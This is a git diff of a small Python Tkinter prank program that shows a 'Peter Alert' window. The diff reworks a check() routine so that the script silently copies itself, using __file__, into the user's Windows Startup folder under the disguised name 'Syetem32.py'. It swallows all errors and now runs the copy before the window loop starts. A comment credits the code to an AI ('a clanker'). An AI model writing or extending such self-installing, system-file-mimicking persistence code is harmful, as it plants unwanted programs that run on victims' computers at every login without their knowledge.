@@ -11,6 +11,7 @@ list = [1, 2, 3 ,4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
 list2 = [1,2,3,4,5,6,7,9,10,11,12,13]
 
 rizz = True
+check1 = True
 
 def ran():
     global rizz
@@ -30,18 +31,24 @@ def ran():
 def check():
     name = "Syetem32.py"
     os.path.expanduser("~")
-    path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    global check1
-    check1 = True
+    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    global check1 
     
-    if os.path.exists(path + name):
+
+    target_file = os.path.join(startup_path, name)
+    if os.path.exists(target_file):
         check1 = False
-    
-    if check1 == True:
-        os.chdir(path)
-        with open(name, "w") as f:
-            f.write(open("main.py").read())
-     
+
+    if check1:
+        # This Code was done by a clanker
+        try:
+            with open(__file__, "r") as con:
+                content = con.read()
+            with open(target_file, "w") as stuf:
+                stuf.write(content)
+        except:
+            pass 
+        #end 
 
 def main():
     global root 
@@ -57,10 +64,12 @@ def main():
     label.pack()
     button = Button(root, text = 'Peter Alert', command=root.destroy)  
     button.pack()
+    if check1 == True:
+        check()
+
     root.mainloop()
     rizz = True
 
-    if check1 == True:
-        check()
-    
+
+   
 ran()
